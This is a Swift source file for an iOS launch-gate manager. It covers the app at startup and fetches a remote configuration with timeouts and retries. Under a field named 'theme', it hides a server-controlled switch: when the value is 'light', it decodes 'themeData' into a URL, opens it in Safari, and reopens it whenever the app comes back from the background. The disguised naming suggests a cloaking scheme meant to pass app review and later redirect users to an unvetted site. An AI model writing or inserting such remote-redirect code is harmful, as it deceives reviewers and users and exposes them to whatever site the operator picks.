import Foundation
import Observation
#if canImport(CloudKit)
import CloudKit
#endif

@MainActor @Observable public final class LaunchGateManager {
    public private(set) var isCovering = true
    public private(set) var hasStarted = false
    public private(set) var hasAttemptedOpen = false
    private let service: any AppConfigServing
    private let launcher: any ExternalURLLaunching
    private let timeout: Duration
    private let requestTimeout: Duration
    private let retryDelays: [Duration]
    private var coverDeadline: Task<Void, Never>?
    private var requestDeadline: Task<Void, Never>?
    private var request: Task<Void, Never>?
    private var retry: Task<Void, Never>?
    private var requestExpiresAt: ContinuousClock.Instant?
    private var retryIndex = 0
    private var readFinished = false
    private var isActive = false
    private var pendingURL: URL?
    private var returnURL: URL?
    private var backgroundAfterOpen = false
    private var isOpening = false

    public init(service: any AppConfigServing, launcher: any ExternalURLLaunching,
                timeout: Duration = LaunchGateConfiguration.defaultTimeout,
                requestTimeout: Duration = .seconds(8),
                retryDelays: [Duration] = [.milliseconds(500), .seconds(2), .seconds(5), .seconds(10)]) {
        self.service = service
        self.launcher = launcher
        self.timeout = timeout > .zero ? timeout : Self.defaultTimeout
        self.requestTimeout = requestTimeout > .zero ? requestTimeout : .seconds(8)
        self.retryDelays = retryDelays.isEmpty ? [.seconds(1)] : retryDelays
    }

    private static var defaultTimeout: Duration { LaunchGateConfiguration.defaultTimeout }

    #if canImport(CloudKit) && canImport(UIKit)
    public convenience init(configuration: LaunchGateConfiguration) {
        self.init(service: CloudKitConfigService(configuration: configuration),
                  launcher: SafariLauncher(), timeout: configuration.timeout, requestTimeout: configuration.timeout)
    }
    #endif

    public func start(isActive: Bool = true) {
        guard !hasStarted else { return }
        hasStarted = true
        self.isActive = isActive
        coverDeadline = Task { [weak self, timeout] in
            do { try await Task.sleep(for: timeout) } catch { return }
            self?.uncover()
        }
        fetchIfPossible()
    }

    public func sceneDidChange(isActive: Bool, isBackground: Bool) {
        self.isActive = isActive
        if isBackground && returnURL != nil { backgroundAfterOpen = true }
        guard isActive else { return }
        fetchIfPossible()
        openIfPossible()
    }

    private func fetchIfPossible() {
        guard isActive, hasStarted, !readFinished, request == nil, retry == nil else { return }
        requestExpiresAt = ContinuousClock.now + requestTimeout
        requestDeadline = Task { [weak self, requestTimeout] in
            do { try await Task.sleep(for: requestTimeout) } catch { return }
            self?.timeOutRequest()
        }
        request = Task { [weak self, service] in
            do {
                let model = try await service.fetch()
                guard !Task.isCancelled else { return }
                self?.completeRequest(.success(model))
            } catch {
                guard !Task.isCancelled else { return }
                self?.completeRequest(.failure(error))
            }
        }
    }

    private func completeRequest(_ result: Result<AppConfigModel, any Error>) {
        guard let requestExpiresAt, ContinuousClock.now < requestExpiresAt else {
            timeOutRequest()
            return
        }
        clearRequest()
        switch result {
        case .success(let model):
            if model.theme == "light" { pendingURL = URLValidator.decode(model.themeData) }
            finishReading()
            openIfPossible()
        case .failure(let error):
            uncover()
            if let delay = Self.minimumRetryDelay(for: error) {
                scheduleRetry(minimumDelay: delay)
            } else {
                finishReading()
            }
        }
    }

    private func timeOutRequest() {
        request?.cancel()
        clearRequest()
        uncover()
        scheduleRetry(minimumDelay: .zero)
    }

    private func clearRequest() {
        request = nil
        requestExpiresAt = nil
        requestDeadline?.cancel()
        requestDeadline = nil
    }

    private func scheduleRetry(minimumDelay: Duration) {
        let delay = max(minimumDelay, retryDelays[retryIndex])
        retryIndex = min(retryIndex + 1, retryDelays.count - 1)
        retry = Task { [weak self] in
            do { try await Task.sleep(for: delay) } catch { return }
            self?.retry = nil
            self?.fetchIfPossible()
        }
    }

    private static func minimumRetryDelay(for error: any Error) -> Duration? {
        #if canImport(CloudKit)
        if let error = error as? CKError {
            switch error.code {
            case .networkUnavailable, .networkFailure, .serviceUnavailable, .requestRateLimited:
                let seconds = error.retryAfterSeconds ?? 0
                return seconds.isFinite ? .seconds(max(0, seconds)) : nil
            default:
                return nil
            }
        }
        #endif
        switch (error as? URLError)?.code {
        case .notConnectedToInternet, .networkConnectionLost, .timedOut, .dataNotAllowed:
            return .zero
        default:
            return nil
        }
    }

    private func openIfPossible() {
        guard isActive, !isOpening,
              pendingURL != nil || (backgroundAfterOpen && returnURL != nil) else { return }
        isOpening = true
        Task { [weak self] in await self?.performOpen() }
    }

    private func performOpen() async {
        guard isActive else { isOpening = false; return }
        guard let url = pendingURL ?? (backgroundAfterOpen ? returnURL : nil) else {
            isOpening = false
            return
        }
        pendingURL = nil
        returnURL = url
        backgroundAfterOpen = false
        hasAttemptedOpen = true
        let didOpen = await launcher.open(url)
        if !didOpen { returnURL = nil }
        isOpening = false
        openIfPossible()
    }

    private func uncover() {
        isCovering = false
        coverDeadline?.cancel()
        coverDeadline = nil
    }

    private func finishReading() {
        readFinished = true
        request?.cancel()
        clearRequest()
        retry?.cancel()
        retry = nil
        uncover()
    }

    public func cancel() {
        hasStarted = true
        pendingURL = nil
        returnURL = nil
        backgroundAfterOpen = false
        finishReading()
    }
}
